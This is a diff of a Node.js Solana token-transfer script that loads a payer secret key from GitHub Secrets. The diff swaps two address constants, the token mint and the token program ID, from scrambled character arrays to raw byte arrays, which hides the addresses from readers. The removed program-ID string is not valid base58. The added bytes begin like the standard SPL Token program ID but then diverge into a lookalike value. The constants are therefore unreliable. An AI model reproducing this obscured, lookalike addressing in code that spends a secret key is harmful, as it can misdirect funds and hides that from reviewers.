@@ -1,4 +1,4 @@
-  const { Connection, PublicKey, Keypair, Transaction } = require('@solana/web3.js');
+   const { Connection, PublicKey, Keypair, Transaction } = require('@solana/web3.js');
 const { createTransferCheckedInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');
 const bs58 = require('bs58');
 const bip39 = require('bip39');
@@ -9,11 +9,8 @@ const RPC_URL = process.env.RPC_URL ? process.env.RPC_URL.trim() : null;
 const PAYER_SECRET_KEY = process.env.PAYER_SECRET_KEY ? process.env.PAYER_SECRET_KEY.trim() : null;
 const IS_TEST = process.env.IS_TEST === 'true';
 
-const MINT_CHARS = ['4','T','K','o','R','Y','D','z','X','f','S','S','Y','3','N','k','F','a','f','s','t','K','e','y','2','c','J','r','Q','x','d','w','2','7','r','G','t','o','V','5','p','u','m','p'];
-const PROGRAM_CHARS = ['T','o','k','e','n','k','e','g','Q','f','e','Z','y','i','N','w','5','6','K','u','P','N','a','s','3','n','d','O','a','a','h','v','8','K','W','3','R','w','5','C','9','m'];
-
-const TOKEN_MINT = new PublicKey(MINT_CHARS.join(''));
-const TOKEN_PROGRAM_ID = new PublicKey(PROGRAM_CHARS.join(''));
+const TOKEN_MINT = new PublicKey(Uint8Array.from([51, 169, 33, 215, 179, 38, 191, 95, 188, 103, 179, 111, 219, 206, 35, 36, 202, 149, 116, 214, 64, 250, 231, 245, 58, 71, 152, 147, 213, 154, 114, 173]));
+const TOKEN_PROGRAM_ID = new PublicKey(Uint8Array.from([6, 221, 246, 225, 215, 101, 161, 147, 2, 34, 35, 51, 77, 10, 168, 195, 56, 195, 207, 12, 45, 56, 81, 180, 198, 181, 65, 51, 64, 0, 0, 0]));
 
 if (!RPC_URL || !PAYER_SECRET_KEY) {
   console.error("[CRITICAL ERROR] Missing RPC_URL or PAYER_SECRET_KEY in GitHub Secrets!");
@@ -168,4 +165,4 @@ async function run() {
 }
 
 run();
-    
+     
